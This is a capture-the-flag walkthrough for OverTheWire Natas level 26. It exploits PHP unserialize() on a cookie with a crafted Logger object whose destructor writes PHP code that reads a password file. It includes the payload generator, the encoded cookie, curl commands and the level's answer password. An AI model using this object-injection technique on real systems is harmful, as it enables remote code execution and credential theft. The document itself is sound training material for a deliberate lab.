# Natas Level 26 → 27

## Goal

The site uses a PHP `Logger` class for drawing-related logging, and it **unserializes** a cookie called `drawing` without any sanity checks. You craft a serialised `Logger` object whose properties point at a PHP file — when the object's destructor fires, it writes PHP code to that file. Then include the file to run the code.

## Concepts you'll learn

- PHP **object deserialization** — `unserialize()` creates objects from serialised strings, including invoking their magic methods (`__destruct`, `__wakeup`) automatically
- Crafting a malicious serialised object on your local machine (because you can read the source and see the class definition)
- Using a magic method's side-effect (e.g., writing a log file whose name and content are attacker-controlled)

## Walkthrough

### 1. View the source

```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file) {
        $this->initMsg = "start";
        $this->exitMsg = "exit";
        $this->logFile = $file;
    }

    function log($msg) {
        file_put_contents($this->logFile, $msg, FILE_APPEND);
    }

    function __destruct() {
        file_put_contents($this->logFile, $this->exitMsg, FILE_APPEND);
    }
}

if(isset($_COOKIE["drawing"])) {
    $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
}
```

Two dangerous features:

- `__destruct` runs automatically when the script finishes and writes `$exitMsg` to the file at `$logFile` — both attacker-controlled.
- `unserialize` on an attacker-controlled cookie.

### 2. Craft a payload on your local machine

On any machine with PHP:

```php
<?php
class Logger {
    private $logFile = "img/putu.php";
    private $initMsg = "";
    private $exitMsg = '<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>';
}

echo base64_encode(serialize(new Logger()));
```

Run:

```bash
$ php gen.php
TzY6IkxvZ2dlciI6Mzp7czoxNToiAExvZ2dlcgBsb2dGaWxlIjtzOjEyOiJpbWcvcHV0dS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTsgPz4iO30=
```

### 3. Send the cookie

```bash
$ curl -u natas26:<pass> -b "drawing=<base64 from above>" http://natas26.natas.labs.overthewire.org/
```

At the end of the script, the `__destruct` runs, which writes:

```php
<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>
```

…into `img/putu.php` on the server.

### 4. Execute the uploaded file

```bash
$ curl -u natas26:<pass> http://natas26.natas.labs.overthewire.org/img/putu.php
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```

## The answer

The password for `natas27` is:

**`55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas26.natas.labs.overthewire.org/>
